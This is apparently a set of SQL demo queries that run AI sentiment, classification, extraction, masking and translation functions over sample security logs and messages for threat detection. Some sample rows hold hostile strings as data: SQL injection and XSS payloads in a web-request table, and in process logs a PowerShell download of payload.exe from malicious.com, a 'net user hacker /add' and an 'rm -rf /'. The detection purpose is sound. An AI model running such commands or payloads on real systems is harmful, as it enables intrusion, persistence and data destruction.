--- AI SENTIMENT ---

-- Insider Threat Detection (Messaging Platform)
WITH message_data AS (
    SELECT
    'user123' AS user_id,
    'This project is a complete disaster!  I''m so frustrated with management.  I''m thinking of taking my talents elsewhere.' AS message_text
    UNION ALL
    SELECT
    'user456' AS user_id,
    'Great work team!  Let''s keep up the momentum.' AS message_text
    UNION ALL
    SELECT
    'user789' AS user_id,
    'I just downloaded all the customer data.  Don''t tell anyone.' AS message_text
    UNION ALL
    SELECT
    'user789' AS user_id,
    'I can not download all the customer data.  Please provide assistance.' AS message_text
    )
SELECT
    user_id,
    message_text,
    regexp_replace(ai_analyze_sentiment(message_text), '(?s)^.*?</think>\s*', '') AS sentiment
FROM message_data;

-- Phishing Email Detection
WITH email_data AS (
    SELECT
        'urgent_account_issue@example.com' AS sender,
        'Your account has been compromised!  Click here IMMEDIATELY to avoid permanent suspension.  Failure to act will result in data loss!' AS email_body
    UNION ALL
    SELECT
        'support@legitcompany.com' AS sender,
        'We are writing to inform you about an upcoming scheduled maintenance window.  There may be brief interruptions to service.' AS email_body
    UNION ALL
    SELECT
        'newsletter@company.com' AS sender,
        'We are excited to announce our new product line!  Check out the amazing features and special offers.' AS email_body
)
SELECT
    sender,
    email_body,
    regexp_replace(ai_analyze_sentiment(email_body), '(?s)^.*?</think>\s*', '') AS sentiment
FROM email_data;

-- Detecting urgency or distress in support requests.
WITH support_requests AS (
SELECT 'userA' as user_id, 'I am locked out of my account and I cannot access critical systems. This is extremely urgent!' as request
UNION ALL
SELECT 'userB' as user, 'How do I reset my password' as request
)
SELECT user_id, request, regexp_replace(ai_analyze_sentiment(request), '(?s)^.*?</think>\s*', '') AS sentiment
FROM support_requests;




--- AI CLASSIFICATION ---

-- Classifying Firewall Log Entries
WITH firewall_logs AS (
    SELECT 'Blocked connection from 192.168.1.100 to port 22, repeated attempts' AS log_entry
    UNION ALL
    SELECT 'User jdoe accessed restricted file share /finance/budgets' AS log_entry
    UNION ALL
    SELECT 'Large outbound data transfer to 10.0.0.5 detected' AS log_entry
    UNION ALL
    SELECT 'Successful VPN connection from user asmith' AS log_entry
    UNION ALL
    SELECT 'Multiple failed login attempts for user bsmith from external IP' as log_entry
)
SELECT
    log_entry,
    regexp_replace(ai_classify(log_entry, ARRAY['Attack Attempt', 'Policy Violation', 'Network Scan', 'Legitimate Traffic']), '(?s)^.*?</think>\s*', '') AS classification
FROM firewall_logs;

-- Identifying Phishing Email Subjects
WITH email_subjects AS (
    SELECT 'URGENT: Your account has been compromised!' AS subject
    UNION ALL
    SELECT 'You have won a free iPhone! Claim your prize now!' AS subject
    UNION ALL
    SELECT 'Meeting Reminder: Project Kickoff' AS subject
    UNION ALL
    SELECT 'Your Bank of America account requires immediate verification' AS subject
    UNION ALL
    SELECT 'Newsletter - July Edition' AS subject
)
SELECT
    subject,
    regexp_replace(ai_classify(subject, ARRAY['Phishing', 'Spam', 'Legitimate']), '(?s)^.*?</think>\s*', '') AS classification
FROM email_subjects;

-- Categorizing Security Alerts
WITH siem_alerts AS (
    SELECT 'Alert: Trojan.Generic detected on host server123' AS alert_description
    UNION ALL
    SELECT 'Alert: Unusual large file upload to external cloud storage' AS alert_description
    UNION ALL
    SELECT 'Alert: User account login from multiple geolocations within 1 hour' AS alert_description
    UNION ALL
    SELECT 'Alert: User downloaded large number of documents from sensitive share' AS alert_description
    UNION ALL
    SELECT 'Alert: Application crash reported on user workstation' as alert_description
)
SELECT
    alert_description,
    regexp_replace(ai_classify(alert_description, ARRAY['Malware', 'Data Exfiltration', 'Credential Compromise', 'Insider Threat', 'Application Error']), '(?s)^.*?</think>\s*', '') AS threat_category
FROM siem_alerts;

-- Classifying Web Requests (URL Categorization)
WITH web_requests AS (
    SELECT *
    FROM (VALUES
    (1, '/admin.php?id=1;SELECT * FROM users', '2024-07-27 10:00:00', '192.0.2.1'),
    (2, '/blog/post.php?id=123', '2024-07-27 10:01:00', '192.0.2.5'),
    (3, '<script>alert("XSS")</script>', '2024-07-27 10:02:00', '192.0.2.10'),
    (4, '/login.php', '2024-07-27 10:03:00', '192.0.2.15'),
    (5, '/products.php?category=electronics'' OR ''1''=''1', '2024-07-27 10:04:00', '192.0.2.20'),
    (6, '/contact.php', '2024-07-27 10:05:00', '192.0.2.25')
    ) AS t (request_id, url, timestamp, source_ip)
    )
SELECT
    request_id,
    url,
    regexp_replace(ai_classify(url, ARRAY['SQL Injection', 'Cross-Site Scripting (XSS)', 'Normal Traffic', 'Path Traversal', 'Command Injection']), '(?s)^.*?</think>\s*', '') AS attack_type
FROM web_requests;




--- AI EXTRACT ---

-- Extracting Usernames and IP Addresses from Authentication Logs
WITH AuthenticationLogs AS (
    SELECT * FROM (VALUES
        ('2024-10-27 10:00:00 User jdoe logged in successfully from 192.168.1.100'),
        ('2024-10-27 10:01:00 User asmith login failed from 10.0.0.5'),
        ('2024-10-27 10:05:00 Authentication failure for user bbrown from 203.0.113.25'),
        ('2024-10-27 10:10:00 User jdoe logged in successfully from 192.168.1.100'), -- Duplicate entry
        ('2024-10-27 10:12:00 User cjones accessed resource from 172.16.0.23, login successful'),
        ('2024-10-27 10:15:00 System event: User password reset requested by admin for user: djohnson from IP: 192.168.1.5'),
        ('2024-10-27 10:18:00 User evilhacker attempted login from 1.2.3.4')
    ) AS t (log_entry)
)
SELECT
    log_entry,
    regexp_replace(ai_extract(log_entry, ARRAY['username', 'ip_address']), '(?s)^.*?</think>\s*', '') AS extracted_data
FROM AuthenticationLogs;

--  Extracting File Paths and Actions from File Integrity Monitoring (FIM) Logs
WITH FIMLogs AS (
    SELECT * FROM (VALUES
        ('2024-10-27 11:00:00 File /etc/passwd was modified'),
        ('2024-10-27 11:02:00 File /var/log/syslog was created'),
        ('2024-10-27 11:05:00 File /home/user/documents/report.docx was deleted'),
        ('2024-10-27 11:08:00 File /tmp/temp_script.sh was accessed'), --  "accessed" might not be explicitly extracted, but LLM can infer.
        ('2024-10-27 11:10:00 File /usr/bin/malware was created'),
        ('2024-10-27 11:12:00 Attempt to modify file /etc/shadow failed')
    ) AS t (log_entry)
)
SELECT
    log_entry,
    regexp_replace(ai_extract(log_entry, ARRAY['file_path', 'action']), '(?s)^.*?</think>\s*', '') AS extracted_data
FROM FIMLogs;

-- Extracting Command and Process Names from Process Execution Logs
WITH ProcessLogs AS (
    SELECT * FROM (VALUES
    ('2024-10-27 12:00:00 Process powershell.exe executed command "Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\temp\\payload.exe"'),
    ('2024-10-27 12:01:00 Process cmd.exe executed command "net user hacker /add"'),
    ('2024-10-27 12:03:00 Process explorer.exe started'),
    ('2024-10-27 12:05:00 Process svchost.exe (PID 1234) accessed network resource'),
    ('2024-10-27 12:08:00 Process python.exe executed command "import os; os.system(''rm -rf /'')"'),
    ('2024-10-27 12:10:00 Process chrome.exe accessed URL: https://example.com')
    ) AS t (log_entry)
)
SELECT
    log_entry,
    regexp_replace(ai_extract(log_entry, ARRAY['process_name', 'command']), '(?s)^.*?</think>\s*', '') AS extracted_data
FROM ProcessLogs;



--- AI FIX GRAMMAR ---

--  Correcting Grammar in Firewall Logs for Better Reporting
WITH FirewallLogs AS (
    SELECT * FROM (
        VALUES
        (1, 'Firewall denyed incomming conection from 192.168.1.100 to port 80'),
        (2, 'Acess granted to 10.0.0.5, port 443, conection stablished.'),
        (3, 'Connection timeout; user tried login too server.'),
        (4, 'Port scan detectted from IP adress 172.16.0.23.'),
        (5, 'Firewall rule updated; new rule block all trafic.')
    ) AS t (log_id, log_message)
),
CorrectedLogs AS (
    SELECT log_id, regexp_replace(ai_fix_grammar(log_message), '(?s)^.*?</think>\s*', '') AS corrected_message
    FROM FirewallLogs
)
SELECT * FROM CorrectedLogs;

--  Improving Clarity of Intrusion Detection System (IDS) Alerts
WITH IDSALerts AS (
    SELECT * FROM (
        VALUES
        (101, 'SQL injecton atempt detected; malicious payload found.'),
        (102, 'Cross-site scripting (XSS) vulnerability exploitted; user data compromised.'),
        (103, 'Brute force atack on SSH; multiple failed login attempts.'),
        (104, 'Malware donwloaded; file identified as trojan.'),
        (105, 'Data exfiltration attemp; large data transfer to unkown IP.')
    ) AS t (alert_id, alert_message)
),
CorrectedAlerts AS (
    SELECT alert_id, regexp_replace(ai_fix_grammar(alert_message), '(?s)^.*?</think>\s*', '') AS corrected_alert
    FROM IDSALerts
)
SELECT * FROM CorrectedAlerts;



--- AI GEN ---

-- Threat Report Summary Generation
WITH security_logs AS (
    SELECT * FROM (
      VALUES
          (1, '2024-07-27T10:00:00Z', '192.168.1.10', 'user1', 'Failed Login', 'Brute force attempt detected'),
          (2, '2024-07-27T10:15:00Z', '10.0.0.5', 'system', 'Port Scan', 'Multiple connections to closed ports'),
          (3, '2024-07-27T10:30:00Z', '192.168.1.10', 'user1', 'Successful Login', 'Login after multiple failures'),
          (4, '2024-07-27T11:00:00Z', '203.0.113.25', 'unknown', 'Data Exfiltration', 'Large outbound data transfer'),
          (5, '2024-07-27T11:45:00Z', '192.168.1.20', 'user2', 'Malware Detected', 'Trojan.GenericKD.12345 detected')
  ) AS t(log_id, timestamp, ip_address, user, event_type, description)
)
SELECT regexp_replace(ai_gen(
   'Generate a concise security threat report summary based on the following SIEM log entries, include severity and recommendations: ' ||
   (SELECT json_format(CAST(array_agg(CAST(map(
      ARRAY['timestamp', 'ip_address', 'user', 'event_type', 'description'],
      ARRAY[timestamp, ip_address, user, event_type, description]
      ) AS JSON)) AS JSON))
        FROM security_logs)
       ), '(?s)^.*?</think>\s*', '') AS threat_report;

-- Log Anomaly Description and Explanation
WITH firewall_logs AS (
    SELECT * FROM (
      VALUES
          (1, '2024-07-27T12:00:00Z', '192.168.1.1', '8.8.8.8', '443', 'ALLOW'),
          (2, '2024-07-27T12:00:05Z', '192.168.1.1', '8.8.8.8', '443', 'ALLOW'),
          (3, '2024-07-27T12:00:10Z', '192.168.1.1', '8.8.8.8', '443', 'ALLOW'),
          (4, '2024-07-27T12:00:15Z', '192.168.1.1', '172.217.160.142', '443', 'ALLOW'), -- Unusual destination
          (5, '2024-07-27T12:00:20Z', '192.168.1.1', '8.8.8.8', '443', 'ALLOW'),
          (6, '2024-07-27T12:00:20Z', '192.168.1.1', '172.217.160.142', '443', 'ALLOW'),
          (7, '2024-07-27T12:00:20Z', '192.168.1.1', '8.8.8.8', '443', 'ALLOW')
  ) AS t(log_id, timestamp, source_ip, dest_ip, dest_port, action)
),
     anomaly_log AS (
         SELECT * FROM firewall_logs WHERE dest_ip = '172.217.160.142'
     )
SELECT regexp_replace(ai_gen(
               'Describe the potential security issue represented by this unusual firewall log and explain why it might be a concern, given the context of frequent allowed connections to 8.8.8.8:443. Log details: ' ||
               (SELECT CAST(json_format(CAST(array_agg(row(timestamp, source_ip, dest_ip, dest_port, action)) AS JSON)) AS VARCHAR) FROM anomaly_log
               )
       ), '(?s)^.*?</think>\s*', '') AS anomaly_explanation;



-- AI MASKING --

-- Masking PII in User Login Events
WITH LoginEvents AS (
    SELECT 1 AS id, 'User John Doe logged in from 192.168.1.10. Employee ID: EMP12345, Email: john.doe@example.com' AS event_description
    UNION ALL
    SELECT 2 AS id, 'Failed login attempt for Jane Smith (EMP67890) from 203.0.113.25. Email: jane.smith@example.com' AS event_description
    UNION ALL
    SELECT 3 AS id, 'Password reset requested by user Bob Williams, EMP11223, IP: 10.0.0.5, Email: bob.williams@example.com' AS event_description
    UNION ALL
    SELECT 4 AS id, 'Access granted to EMP44556 (Alice Brown) from 172.16.0.100. Email: alice.brown@anotherdomain.net' AS event_description
    UNION ALL
    SELECT 5 AS id, 'EMP99999, David Lee, tried accessing restricted resource from 192.168.1.200, Email: david.lee@company.org' AS event_description
)
SELECT
    id,
    regexp_replace(ai_mask(event_description, ARRAY['employee id', 'ip address', 'email']), '(?s)^.*?</think>\s*', '') AS masked_event_description
FROM LoginEvents;

-- Masking Sensitive Data in Firewall Logs
WITH FirewallLogs AS (
    SELECT 1 AS log_id, 'Connection blocked: Source IP: 10.0.0.1, Destination IP: 172.16.1.25, Port: 80, Protocol: TCP, Contact: +1-555-123-4567' AS log_entry
    UNION ALL
    SELECT 2 AS log_id, 'Connection allowed: Source IP: 192.168.1.100, Destination IP: 203.0.113.5, Port: 443, Protocol: TCP, Phone: 555-987-6543' AS log_entry
    UNION ALL
    SELECT 3 AS log_id, 'Outbound traffic: Source IP: 172.16.5.50, Destination IP: 8.8.8.8, Port: 53, Protocol: UDP, Number: (555) 111-2222' AS log_entry
    UNION ALL
    SELECT 4 AS log_id, 'Inbound traffic: Source IP: 1.2.3.4, Destination IP: 10.1.2.3, Port: 22, Protocol: TCP, Contact Support: 555-555-5555' AS log_entry
    UNION ALL
    SELECT 5 AS log_id, 'Firewall rule updated. Call 555-123-9999 for details. src: 10.10.10.10, dst: 199.199.199.199' AS log_entry
)
SELECT
    log_id,
    regexp_replace(ai_mask(log_entry, ARRAY['ip address', 'phone']), '(?s)^.*?</think>\s*', '') AS masked_log_entry
FROM FirewallLogs;



-- AI TRANSLATE --

-- Translating Japanese Firewall Logs to English
WITH FirewallLogs AS (
    SELECT * FROM (
        VALUES
            (1, '2024-10-27 10:00:00', 'ファイアウォール', '192.168.1.1', '10.0.0.5', 'TCP', '80', '許可', '外部からの接続', '東京'),
            (2, '2024-10-27 10:05:00', 'ファイアウォール', '192.168.1.1', '10.0.0.6', 'UDP', '53', '拒否', '不正なDNSクエリ', '大阪'),
            (3, '2024-10-27 10:10:00', 'ファイアウォール', '192.168.1.2', '10.0.0.7', 'TCP', '443', '許可', 'SSL通信', '名古屋'),
            (4, '2024-10-27 10:15:00', 'ファイアウォール', '192.168.1.3', '10.0.0.8', 'TCP', '22', '拒否', 'SSHブルートフォース', '福岡'),
            (5, '2024-10-27 10:20:00', 'ファイアウォール', '192.168.1.4', '10.0.0.9', 'TCP', '8080', '許可', 'プロキシ経由', '札幌')
    ) AS t (id, log_time, device, src_ip, dest_ip, protocol, port, action, description, location)
),
TranslatedLogs AS (
    SELECT
        id,
        log_time,
        regexp_replace(ai_translate(device, 'en'), '(?s)^.*?</think>\s*', '') as device_en,
        src_ip,
        dest_ip,
        protocol,
        port,
        regexp_replace(ai_translate(action, 'en'), '(?s)^.*?</think>\s*', '') AS action_en,
        regexp_replace(ai_translate(description, 'en'), '(?s)^.*?</think>\s*', '') AS description_en,
        regexp_replace(ai_translate(location, 'en'), '(?s)^.*?</think>\s*', '') AS location_en
    FROM FirewallLogs
)
SELECT * FROM TranslatedLogs;

-- Translating Spanish Intrusion Detection System (IDS) Alerts to English
WITH IDSEvents AS (
    SELECT * FROM (
        VALUES
            (1, '2024-10-27 11:00:00', 'IDS', '172.16.1.5', '203.0.113.10', 'TCP', '21', 'Alerta', 'Intento de explotación de FTP', 'Madrid'),
            (2, '2024-10-27 11:05:00', 'IDS', '172.16.1.6', '203.0.113.11', 'TCP', '25', 'Advertencia', 'Escaneo de puertos SMTP', 'Barcelona'),
            (3, '2024-10-27 11:10:00', 'IDS', '172.16.1.7', '203.0.113.12', 'UDP', '161', 'Alerta', 'Tráfico SNMP inusual', 'Valencia'),
            (4, '2024-10-27 11:15:00', 'IDS', '172.16.1.8', '203.0.113.13', 'TCP', '80', 'Advertencia', 'Posible ataque de cross-site scripting (XSS)', 'Sevilla'),
            (5, '2024-10-27 11:20:00', 'IDS', '172.16.1.9', '203.0.113.14', 'TCP', '445', 'Alerta', 'Actividad de SMB sospechosa', 'Zaragoza')
    ) AS t (id, log_time, device, src_ip, dest_ip, protocol, port, alert_level, description, location)
),
TranslatedIDSEvents AS (
    SELECT
        id,
        log_time,
        regexp_replace(ai_translate(device, 'en'), '(?s)^.*?</think>\s*', '') AS device_en,
        src_ip,
        dest_ip,
        protocol,
        port,
        regexp_replace(ai_translate(alert_level, 'en'), '(?s)^.*?</think>\s*', '') AS alert_level_en,
        regexp_replace(ai_translate(description, 'en'), '(?s)^.*?</think>\s*', '') AS description_en,
        regexp_replace(ai_translate(location,'en'), '(?s)^.*?</think>\s*', '') as location_en
    FROM IDSEvents
)
SELECT * FROM TranslatedIDSEvents;
